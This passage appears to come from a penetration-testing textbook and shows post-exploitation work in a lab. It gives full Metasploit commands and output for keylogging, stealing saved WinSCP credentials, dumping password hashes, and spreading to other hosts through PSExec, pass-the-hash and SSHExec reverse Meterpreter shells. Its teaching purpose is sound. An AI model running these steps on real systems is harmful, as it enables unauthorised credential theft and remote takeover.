### Keylogger Demonstration
To demonstrate the use of a keylogger, switch to Windows XP and perform the following steps:
1. Press `Ctrl + R` to open the Run dialog.
2. Type `notepad.exe` and press Enter to start Notepad.
3. In Notepad, type `hi georgia`.

To view the keystrokes logged by the keylogger, enter the `keyscan_dump` command in Meterpreter:

```plaintext
meterpreter > keyscan_dump
Dumping captured keystrokes...
 notepad.exe  hi georgia 
```

To stop the keylogger, enter the `keyscan_stop` command:

```plaintext
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Gathering Credentials
In Chapter 9, we covered password hashes from Windows, Linux, and the FileZilla FTP server. Users may also have other stored credentials on their local systems. Metasploit provides several post-exploitation modules for gathering passwords for specific software, located in `/usr/share/metasploit-framework/modules/post/windows/gather/credentials`.

For this example, we will steal stored credentials from WinSCP, a secure copy tool for Windows.

#### Setting Up WinSCP
1. Open WinSCP.
2. Set the File protocol to SCP.
3. Enter the IP address of the Ubuntu target as the Host name.
4. Use the credentials `georgia:password`.
5. Click "Save As" under the login information.
6. When prompted, enter a session name and check the "Save password" box.

#### Using Metasploit to Steal Credentials
Switch back to Kali Linux and use the `post/windows/gather/credentials/winscp` module:

```plaintext
msf > use post/windows/gather/credentials/winscp
msf post(winscp) > show options

Module options (post/windows/gather/credentials/winscp):
Name     Current Setting Required Description
----     --------------- -------- -----------
SESSION  yes             The session to run this module on.

msf post(winscp) > set session 1
session => 1
msf post(winscp) > exploit
[*] Looking for WinSCP.ini file storage...
[*] WinSCP.ini file NOT found...
[*] Looking for Registry Storage...
[*] Host: 192.168.20.9 Port: 22 Protocol: SSH Username: georgia Password: password
[*] Done!
[*] Post module execution completed
```

The module discovers the saved credentials, as shown in the output.

### Network Information with `net` Commands
The `net` command in Windows allows you to view and edit network information. To access a Windows command shell via Meterpreter, use the `shell` command:

```plaintext
meterpreter > shell
--snip--
C:\Windows\system32>
```

To list all local users, use the `net users` command:

```plaintext
C:\Windows\system32> net users
User accounts for \\
------------------------------------------------------------------------------
Administrator  georgia  secret  Guest
```

To view the members of a group, use the `net localgroup` command:

```plaintext
C:\Windows\system32> net localgroup Administrators
Alias name       Administrators
Comment          Administrators have complete and unrestricted access to the computer/domain
Members
-----------------------------------------------------------------------------------------------
Administrator
georgia
secret
The command completed successfully.
```

To exit the shell and return to Meterpreter, type `exit`.

### UDP Scans and TFTP Vulnerabilities
In Chapter 5, we used Nmap to perform a UDP scan. UDP scans are less precise than TCP scans. For example, port 69/UDP on the Windows XP target, traditionally used for TFTP, returned `open|filtered`. This indicates that it was unclear if anything was listening on that port.

Now that we have access to the system, we can further investigate running software for any vulnerabilities. One such process is `3CTftpSvc.exe`, an older version of the 3Com TFTP service vulnerable to a buffer overflow in TFTP long transport mode.

### Checking Bash History
On a Linux system, the Bash history file (`~/.bash_history`) can contain potentially interesting information. For example, a user might have saved a plaintext password in their Bash history:

```plaintext
georgia@ubuntu:~$ cat .bash_history
my password is password
--snip--
```

### Lateral Movement
Once you have access to one system in a networked environment, you can attempt to access additional systems and their sensitive data. If the exploited system is part of a domain, you can try to compromise a domain account or gain domain administrator access.

Even without domain control, you may still be able to access other systems if they share the same local administrator password. Additionally, if a user has the same password on multiple systems, you can log in using those credentials.

### PSExec
PSExec is a technique from the Sysinternals Windows management toolset. It uses valid credentials to connect to the ADMIN$ share on a Windows SMB server, uploads a Windows service executable, and starts the service to remotely control the target system.

Metasploit's `exploit/windows/smb/psexec` module implements a similar technique. It requires a running SMB server on the target and credentials for the ADMIN$ share.

Using the credentials `georgia:password`, you can use the PSExec module as follows:

```plaintext
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > show options

Module options (exploit/windows/smb/psexec):
Name      Current Setting Required Description
----      --------------- -------- -----------
RHOST     yes             The target address
RPORT     445             yes       Set the SMB service port
SHARE     ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$, C$,...) or a normal read/write folder share
SMBDomain WORKGROUP       no        The Windows domain to use for authentication
SMBPass   no               The password for the specified username
SMBUser   no               The username to authenticate as

msf exploit(psexec) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
msf exploit(psexec) > set SMBUser georgia
SMBUser => georgia
msf exploit(psexec) > set SMBPass password
SMBPass => password
msf exploit(psexec) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Connecting to the server...
[*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'...
[*] Uploading payload...
[*] Created \KoMknErc.exe...
--snip--
[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173) at 2015-08-14 14:13:40 -0400
```

### Pass the Hash
If you cannot reverse the password hash, you can use the Pass the Hash technique with PSExec. Instead of setting the `SMBPass` option to the plaintext password, use the LM and NTLM hashes.

Using the hashes from the `hashdump` command:

```plaintext
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
--snip--

msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
--snip--
[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233) at 2015-08-14 14:17:47 -0400
```

### SSHExec
For Linux systems, you can use the `multi/ssh/sshexec` module to move through the environment with valid credentials. Here are the steps:

```plaintext
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > show options

Module options (exploit/multi/ssh/sshexec):
Name     Current Setting Required Description
----     --------------- -------- -----------
PASSWORD yes             The password to authenticate with.
RHOST    yes             The target address
RPORT    22              yes       The target port
USERNAME root            yes       The user to authenticate as.

msf exploit(sshexec) > set RHOST 192.168.20.11
RHOST => 192.168.20.11
msf exploit(sshexec) > set USERNAME georgia
USERNAME => georgia
msf exploit(sshexec) > set PASSWORD password
PASSWORD => password
msf exploit(sshexec) > show payloads
--snip--
linux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP
Stager
--snip--
```

By following these steps, you can effectively gather credentials, move laterally within a network, and exploit vulnerabilities across different systems.
